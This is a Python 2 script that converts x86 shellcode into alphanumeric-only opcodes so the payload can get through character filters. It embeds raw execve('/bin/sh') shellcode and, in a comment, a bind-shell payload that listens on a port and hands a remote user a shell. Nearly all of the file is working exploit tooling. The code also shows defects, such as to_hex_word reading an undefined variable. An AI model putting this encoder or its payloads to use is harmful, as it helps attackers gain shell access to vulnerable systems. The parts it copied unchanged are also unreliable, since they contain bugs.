import string
from asm import Asm, a_print as a
none = lambda *args: None
import xor
forbidden_chars = "" # String of forbidden chars - '0' must be valid
valid_chars = \
(string.digits + string.ascii_letters).translate(None, forbidden_chars)
valid_bytes = [ord(c) for c in valid_chars]
valid_bytesff = [ord(c) for c in valid_chars.replace("0", "\xff")]

expand = {}
for x in valid_bytes:
	for y in valid_bytes:
		if (x ^ y in valid_bytes):
			expand[x ^ y] = [x, y]

xors = {}
xors[0xff] = [0xff, valid_bytesff[1], valid_bytesff[1]]
for x in valid_bytes: xors[x] = [x]
for x in valid_bytesff:
	for y in valid_bytes:
		if not (x ^ y in xors): xors[x ^ y] = [x, y]
for x in valid_bytesff:
	for y in valid_bytes:
		for z in valid_bytes:
			if not (x ^ y ^ z in xors): xors[x ^ y ^ z] = [x, y, z]

def display_xors():
	for n in range(len(xors)):
		print hex(n) + " = " + " ^ ".join(hex(x) for x in xors[n])

def offset_split_as_valids(offset):
        '''
        Returns x, y, z verifying that y and z are valid bytes and that
        2 * (x * 0x100 + y) + z = offset + x + (x ? 4 : 0)
        '''
	hundreds = 0
        incpoppushdec = 4 # Asm("inc %esp; pop %ecx; push %ecx; dec %esp").length
	while True:
		if hundreds == 1: offset += incpoppushdec
		for once in valid_bytes:
			for twice in valid_bytes:
				if offset == 2*(hundreds * 0x100 + twice) + once:
					return hundreds, once, twice
		hundreds += 1
                offset += 1

def word_xors(word):
	'''
        Input = word : byte array
        Output = words : (byte array) array verifying that
        for i in range(len(word)): word[i] == xor(word[i] for word in words)
        '''
	words_nb = max(len(xors[x]) for x in word)
	words = [[] for i in range(words_nb)]
	# print words
	for x in word:
		i = 0
		for x2 in xors[x]:
			words[i].append(x2)
			i += 1
		while (i < words_nb):
			dec1, dec2 = expand[words[i - 1][-1]]
			words[i - 1][-1] = dec1
			words[i].append(dec2)
			i += 1
	return words

def to_hex_word(bytes):
        '''
        Converts a series of bytes into its integer representation,
        but replacing the byte 0xff by 0x30
        '''
        assert(len(bytes) <= 4)
	return "0x" + "".join(chr([i, 0x30][int(i == 0xff)]).encode('hex') for i in word[::-1])

def push_alpha(asm, word):
        '''
        Push the bytes from word using alphanumeric opcodes only
        (Requires %esi = -0x34, %dl = 0x30 ^ 0xff = 0xcf and %ecx = 0xffffffff)
        '''
        assert(len(word) <= 4)
	ff_nb = sum(int(i == 0xff) for i in word)
	if ff_nb == 4:
		asm.pushl("%ecx")
		return
	if word[2:4] == [0xff, 0xff]:
		asm.pushw("%cx")
		asm.pushw("$0x" + to_hex_word(word)[6:])
		for i in range(2):
			if word[i] == 0xff:
				asm.xorb("%dl", "0x" + str(34 + i) + "(%esp, %esi)")
		return
	asm.pushl("$" + to_hex_word(word))
	for i in range(4):
		if word[i] == 0xff:
			asm.xorb("%dl", "0x" + str(34 + i) + "(%esp, %esi)")
	return

def append_prologue(asm):
	@asm.macro()
	def pmov(src, dst):
		asm.push(src)
		asm.popl(dst)

	asm.macro\
	("zero_eax")(lambda: \
	none(\
		asm.pmov("$0x41414141", "%eax"),\
		asm.xorl("$0x41414141", "%eax"),\
	))

	@asm.macro()
	def set_regs(eax="%eax", ecx="%ecx", edx="%edx", ebx="%ebx",\
			ebp="%ebp", esi="%esi", edi="%edi", buried="%eax"):
		asm.push(eax)
		asm.push(ecx)
		asm.push(edx)
		asm.push(ebx)
		asm.push(buried)
		asm.push(ebp)
		asm.push(esi)
		asm.push(edi)
		asm.popa()

	asm.macro("rep_add")\
	(lambda n, reg:\
		asm("\n\t".join(("inc " if n >= 0 else "dec ") + reg\
		for i in range(abs(n)))))

	@asm.macro()
	def pop_eip(reg):
		asm.rep_add(-4, "%esp")
		asm.popl(reg)

	@asm.macro()
	def init_regs():
		asm.pop_eip("%ecx")
		asm.zero_eax()
		asm.decl("%eax")
		asm.pmov("%eax", "%edx")
		asm.xorb("$0x33", "%al")
		asm.set_regs(eax = "%edx", ebx = "%edx", ecx = "%edx", edx = "%eax", esi = "%eax", edi = "%eax", ebp = "%ecx")
		asm.incl("%ebx")
		asm.rep_add(3, "%edx")
	asm.init_regs()
	asm.pmov("%eax", "%ecx")

	asm.assemble()
	print "====="
	print asm.to_string()
	print "====="
        return Asm(".ascii \"LLLLYhAAAAX5AAAAHPZ43RRPRPQPPaCBBBTDYAAQLTY3L44QY3d40PYQX5Z0ZZ5hO55P\"")

if __name__ == "__main__":
	display_xors()
	sc = "\x6a\x0b\x58\x99\x52\xeb\x08\x89\xe1\x5b\x88\x53\x07\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
	#sc = "\x31\xff\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x57\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\x31\xc0\x31\xdb\xb0\x66\xb3\x0e\x6a\x04\x54\x6a\x02\x6a\x01\x52\x89\xe1\xcd\x80\x31\xc0\x31\xdb\xb0\x66\xb3\x02\x57\x66\x68\x10\x92\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x31\xc0\x31\xdb\xb0\x66\xb3\x04\x57\x52\x89\xe1\xcd\x80\x31\xc0\x31\xdb\xb0\x66\xb3\x05\x57\x57\x52\x89\xe1\xcd\x80\x89\xc3\x31\xc0\xb0\x3f\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\x41\xcd\x80\x31\xc0\xb0\x3f\x41\xcd\x80\x31\xc0\xb0\x0b\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xcd\x80"

        # align the length of the shellcode to a multiple of 4
	sc += (-len(sc) % 4) * 'G' # 'G' -> "inc %edi"
	print sc + " : " + str(len(sc)) + " bytes."

	asm = Asm()
	asm.autoassemble = False
	prologue = append_prologue(asm)

	asm.macro("push_alpha")(lambda word: push_alpha(asm, word))
	all_words = \
[word_xors([ord(c) for c in sc[4 * i:4 * i + 4]]) for i in range(len(sc) / 4)]
	for words in all_words[::-1]:
		print [to_hex_word(word) for word in words]
		asm.push_alpha(words[0])
		asm.popl("%eax")
		for i in range(1, len(words)):
			asm.xorl("$" + to_hex_word(words[i]), "%eax")
		asm.pushl("%eax")
	asm.assemble()
	push_code = asm # Asm("".join(push_codes))
	print "Push assembly (" + str(push_code.length) + " bytes):"
        print push_code.ascii
	total_length = push_code.length + 12 # + prologue_length

	hundreds, offset, edx = offset_split_as_valids(total_length)
	print "hundreds:", hundreds
	print "offset:", hex(offset)
	print "edx:", hex(edx) + "\n"
	epilogue_ascii = ""
	if hundreds > 0: epilogue_ascii += "DZ" + "B" * hundreds + "RL"
	epilogue = Asm(".ascii \"" + "Tj" + chr(edx) + epilogue_ascii + "ZQX4d0DU" + chr(offset) + "X\"")
	shellcode = push_code.ascii + epilogue.ascii # + prologue.ascii
	print "shellcode =", shellcode
